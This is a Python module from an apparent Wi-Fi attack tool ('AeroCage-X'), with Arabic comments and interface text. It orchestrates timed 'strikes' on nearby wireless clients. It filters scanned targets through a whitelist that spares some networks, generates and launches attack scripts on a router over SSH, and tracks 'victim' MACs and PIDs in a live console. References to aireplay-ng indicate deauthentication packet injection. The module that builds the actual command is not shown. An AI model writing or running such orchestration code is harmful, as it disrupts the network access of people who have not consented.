#!/usr/bin/env python3
import sys
import os
import time
import threading

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core.ssh_commander import SSHCommander
from modules.strike_whitelist import StrikeWhitelist
from modules.strike_launcher import StrikeLauncher

class StrikeManager:
    def __init__(self, target_ip, password):
        self.commander = SSHCommander(ip=target_ip, password=password)
        self.whitelist = StrikeWhitelist()
        self.launcher = StrikeLauncher(self.commander)
        self.active_strikes = {}
        self.protected_logs = []
        self.blacklist_ignore = []
        self.strike_counter = 1
        self.is_running = True

    def process_radar_targets(self, targets_list, actual_iface):
        for target in targets_list:
            bssid, client, ssid = target["bssid"], target["client"], target.get("ssid", "OpenWrt")
            
            if client in self.blacklist_ignore: continue
            if any(s["client"] == client for s in self.active_strikes.values()): continue

            # الحارس المشدد لشبكة فهد والكاميرات والشبكات المشفرة
            is_safe, reason = self.whitelist.is_target_safe(bssid, ssid, "NONE")
            if not is_safe:
                if {"ssid": ssid, "mac": client, "reason": reason} not in self.protected_logs:
                    self.protected_logs.append({"ssid": ssid, "mac": client, "reason": reason})
                continue

            # توليد الذخيرة الموقوتة وقنص الـ PID الصافي
            strike_cmd = self.launcher.write_strike_to_sh(bssid, client, actual_iface)
            pid = self.launcher.fire_strike_and_get_pid(strike_cmd, client)

            self.active_strikes[self.strike_counter] = {
                "bssid": bssid, "client": client, "ssid": ssid, "pid": pid, "status": "يتم قذفه حياً 🚀"
            }
            self.strike_counter += 1

    def display_control_panel(self, target_ap, channel, mode):
        C_CYAN = "\033[38;5;111m"; G_OK = "\033[38;5;150m"; Y_WARN = "\033[38;5;221m"; D_DIV = "\033[38;5;242m"; RESET = "\033[0m"
        sys.stdout.write("\033[H\033[2J\033[H")
        
        print(f"🧪 {C_CYAN}[ AeroCage-X : محرك الضربات الموجهة والمواجهات التفاعلية المرقمة ]{RESET}")
        print(f"{D_DIV}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
        print(f"📡 الأكسس: [{target_ap}] | 📶 المنفذ: [{channel}] | 🌐 النطاق الترددي: [{mode}]")
        print(f"{D_DIV}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
        
        print(f"{G_OK}[ الهجمات الحية النشطة وقذف الحزم التتابعي الموقوت ]{RESET}")
        print(f" {'رقم':<4} | {'ماك الضحية (Client MAC)':<18} | {'الـ PID البعيد':<14} | {'الحالة العتادية للضربة'}")
        print(f"{D_DIV} ─────────────────────────────────────────────────────────────────────────{RESET}")
        for num, s in self.active_strikes.items():
            print(f" [{num:<2}] | {s['client']:<18} | {s['pid']:<14} | {s['status']}")
            
        print(f"\n{Y_WARN}[ 🛡️ شبكات وأجهزة محمية عملياتياً - تم الحظر حماية للمحيط والنيران الصديقة ]{RESET}")
        print(f" {'ماك الجهاز المحمي':<18} | {'اسم الشبكة المحجوبة (SSID)':<25} | {'سبب الحظر العتادي'}")
        print(f"{D_DIV} ─────────────────────────────────────────────────────────────────────────{RESET}")
        for log in self.protected_logs[-4:]:
            print(f" {log['mac']:<18} | {log['ssid']:<25} | {log['reason']}")
            
        print(f"{D_DIV}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
        print("💡 [دليل التحكم الحركي] ➡️ لإيقاف هجمة فردية وسحب قذيفتها، اكتب [رقم الهجمة] واضغط Enter.")
        print("                        ➡️ لإنهاء وتطهير معالجات الراوتر بالكامل، اكتب واضغط Enter.")
        print(f"{D_DIV}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
        sys.stdout.write("🔢 الإدخال العملياتي الحالي: ")
        sys.stdout.flush()

    def user_input_listener(self):
        while self.is_running:
            try:
                choice = input().strip()
                if choice == "0":
                    self.is_running = False
                    self.commander.execute_pure_cmd("killall -9 aireplay-ng")
                    sh_p = "/home/kali/AeroCage-X/storage/active_strikes.sh"
                    if os.path.exists(sh_p): os.remove(sh_p)
                    break
                elif choice.isdigit():
                    num = int(choice)
                    if num in self.active_strikes:
                        target = self.active_strikes[num]
                        self.launcher.terminate_strike(target["pid"])
                        self.blacklist_ignore.append(target["client"])
                        del self.active_strikes[num]
            except Exception: pass
